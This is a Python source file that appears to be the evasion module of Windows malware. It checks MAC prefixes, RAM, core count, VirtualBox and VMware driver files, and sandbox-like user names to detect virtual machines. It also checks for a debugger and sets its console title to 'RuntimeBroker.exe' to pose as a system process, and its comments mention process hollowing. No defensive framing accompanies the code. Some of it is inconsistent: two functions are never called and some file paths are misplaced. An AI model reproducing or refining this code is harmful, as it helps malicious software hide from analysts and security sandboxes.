import os, sys, time, subprocess, ctypes, socket, platform

def is_virtualized():
    """Elite Anti-VM & Sandbox Detection."""
    vms = ["vbox", "vmware", "virtualbox", "qemu", "parallels", "sandbox", "hyper-v", "wine"]
    
    # 1. Check MAC Address OUI
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        vm_macs = ["08:00:27", "00:05:69", "00:0c:29", "00:50:56", "00:1c:14", "00:15:5d"]
        if any(mac.startswith(m) for m in vm_macs): return True
    except: pass

    # 2. Check System specs (Low RAM, Core count)
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024: return True # < 4GB RAM
        if psutil.cpu_count() < 2: return True # < 2 cores
    except: pass

    # 3. Check for specific VM drivers/files
    vm_files = [
        "C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
        "C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
        "C:\\windows\\System32\\Drivers\\vmtoolsd.exe",
        "C:\\windows\\System32\\Drivers\\vmtray.exe",
    ]
    for f in vm_files:
        if os.path.exists(f): return True

    # 4. Check Username/Hostname (Common sandbox names)
    user = os.environ.get("USERNAME", "").lower()
    host = socket.gethostname().lower()
    for v in vms:
        if v in user or v in host: return True
        
    return False

def mutate_process():
    """Mutation: Mask process as a system service."""
    try:
        # Renaming title and masking the process name
        ctypes.windll.kernel32.SetConsoleTitleW("RuntimeBroker.exe")
        # In a real compiled EXE, we'd use process hollowing, 
        # but in Python we simulate by renaming the script entry.
    except: pass

def anti_debug():
    """Check for attached debuggers."""
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent(): return True
    except: pass
    return False

if __name__ == "__main__":
    if is_virtualized():
        print("[STEALTH] VM Detected. Self-destructing or idle...")
        sys.exit(0)
    print("[STEALTH] Bare-metal environment confirmed.")
